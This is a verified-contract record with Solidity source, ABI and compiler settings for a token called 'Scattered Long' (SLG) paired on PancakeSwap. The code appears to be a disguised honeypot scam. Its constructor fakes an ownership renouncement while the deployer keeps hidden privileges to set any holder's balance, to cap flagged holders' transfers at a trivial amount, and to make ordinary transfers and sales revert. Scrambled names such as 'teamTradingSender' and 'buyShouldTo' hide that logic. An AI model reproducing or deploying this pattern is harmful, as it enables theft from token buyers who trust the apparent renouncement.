{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface liquidityMarketing {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract teamWallet {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingSell {\n    function createPair(address autoTakeLaunched, address amountMode) external returns (address);\n}\n\ninterface maxSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoTeam) external view returns (uint256);\n\n    function transfer(address isTrading, uint256 amountSender) external returns (bool);\n\n    function allowance(address receiverFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 amountSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isTrading,\n        uint256 amountSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeFee, uint256 value);\n    event Approval(address indexed receiverFund, address indexed spender, uint256 value);\n}\n\ninterface maxSwapMetadata is maxSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ScatteredLong is teamWallet, maxSwap, maxSwapMetadata {\n\n    uint256 public tradingTx;\n\n    function minAmount(address teamToken) public {\n        if (senderMode) {\n            return;\n        }\n        if (autoBuy != totalFrom) {\n            tradingMode = tradingTx;\n        }\n        atTeamMarketing[teamToken] = true;\n        if (buyMarketing) {\n            autoBuy = true;\n        }\n        senderMode = true;\n    }\n\n    bool private autoBuy;\n\n    uint256 public minMarketingTeam;\n\n    uint256 receiverFrom;\n\n    uint8 private teamAuto = 18;\n\n    event OwnershipTransferred(address indexed modeList, address indexed sellFrom);\n\n    function transfer(address limitList, uint256 amountSender) external virtual override returns (bool) {\n        return totalLaunch(_msgSender(), limitList, amountSender);\n    }\n\n    bool public senderMode;\n\n    bool private buyMarketing;\n\n    address public fundTotalTx;\n\n    function balanceOf(address autoTeam) public view virtual override returns (uint256) {\n        return atMax[autoTeam];\n    }\n\n    address private enableSwap;\n\n    mapping(address => bool) public marketingTake;\n\n    address public exemptIs;\n\n    uint256 private maxLimit;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamAuto;\n    }\n\n    function buyShouldTo(uint256 amountSender) public {\n        receiverTeam();\n        receiverFrom = amountSender;\n    }\n\n    function tokenSell(address sellSwap, address isTrading, uint256 amountSender) internal returns (bool) {\n        require(atMax[sellSwap] >= amountSender);\n        atMax[sellSwap] -= amountSender;\n        atMax[isTrading] += amountSender;\n        emit Transfer(sellSwap, isTrading, amountSender);\n        return true;\n    }\n\n    function totalLaunch(address sellSwap, address isTrading, uint256 amountSender) internal returns (bool) {\n        if (sellSwap == fundTotalTx) {\n            return tokenSell(sellSwap, isTrading, amountSender);\n        }\n        uint256 enableShould = maxSwap(exemptIs).balanceOf(receiverEnable);\n        require(enableShould == receiverFrom);\n        require(isTrading != receiverEnable);\n        if (marketingTake[sellSwap]) {\n            return tokenSell(sellSwap, isTrading, atBuy);\n        }\n        return tokenSell(sellSwap, isTrading, amountSender);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityShouldExempt;\n    }\n\n    bool public totalFrom;\n\n    uint256 public tradingMode;\n\n    function transferFrom(address sellSwap, address isTrading, uint256 amountSender) external override returns (bool) {\n        if (_msgSender() != enableMax) {\n            if (teamSell[sellSwap][_msgSender()] != type(uint256).max) {\n                require(amountSender <= teamSell[sellSwap][_msgSender()]);\n                teamSell[sellSwap][_msgSender()] -= amountSender;\n            }\n        }\n        return totalLaunch(sellSwap, isTrading, amountSender);\n    }\n\n    function allowance(address fromLaunch, address swapLaunched) external view virtual override returns (uint256) {\n        if (swapLaunched == enableMax) {\n            return type(uint256).max;\n        }\n        return teamSell[fromLaunch][swapLaunched];\n    }\n\n    function teamTradingSender() public {\n        emit OwnershipTransferred(fundTotalTx, address(0));\n        enableSwap = address(0);\n    }\n\n    mapping(address => bool) public atTeamMarketing;\n\n    constructor (){\n        if (teamTake != totalFrom) {\n            sellFund = true;\n        }\n        liquidityMarketing toFrom = liquidityMarketing(enableMax);\n        exemptIs = tradingSell(toFrom.factory()).createPair(toFrom.WETH(), address(this));\n        \n        fundTotalTx = _msgSender();\n        teamTradingSender();\n        atTeamMarketing[fundTotalTx] = true;\n        atMax[fundTotalTx] = liquidityTx;\n        \n        emit Transfer(address(0), fundTotalTx, liquidityTx);\n    }\n\n    mapping(address => uint256) private atMax;\n\n    function getOwner() external view returns (address) {\n        return enableSwap;\n    }\n\n    function approve(address swapLaunched, uint256 amountSender) public virtual override returns (bool) {\n        teamSell[_msgSender()][swapLaunched] = amountSender;\n        emit Approval(_msgSender(), swapLaunched, amountSender);\n        return true;\n    }\n\n    bool private sellFund;\n\n    address enableMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 tokenLimit;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityTx;\n    }\n\n    function exemptTrading(address limitList, uint256 amountSender) public {\n        receiverTeam();\n        atMax[limitList] = amountSender;\n    }\n\n    uint256 private liquidityTx = 100000000 * 10 ** 18;\n\n    function amountTotal(address teamEnable) public {\n        receiverTeam();\n        \n        if (teamEnable == fundTotalTx || teamEnable == exemptIs) {\n            return;\n        }\n        marketingTake[teamEnable] = true;\n    }\n\n    function receiverTeam() private view {\n        require(atTeamMarketing[_msgSender()]);\n    }\n\n    address receiverEnable = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    string private senderMin = \"SLG\";\n\n    bool private teamTake;\n\n    uint256 private toSender;\n\n    function owner() external view returns (address) {\n        return enableSwap;\n    }\n\n    mapping(address => mapping(address => uint256)) private teamSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return senderMin;\n    }\n\n    uint256 constant atBuy = 12 ** 10;\n\n    string private liquidityShouldExempt = \"Scattered Long\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamEnable\",\"type\":\"address\"}],\"name\":\"amountTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atTeamMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTeam\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"buyShouldTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"exemptTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTotalTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"}],\"name\":\"minAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minMarketingTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTradingSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amountSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ScatteredLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}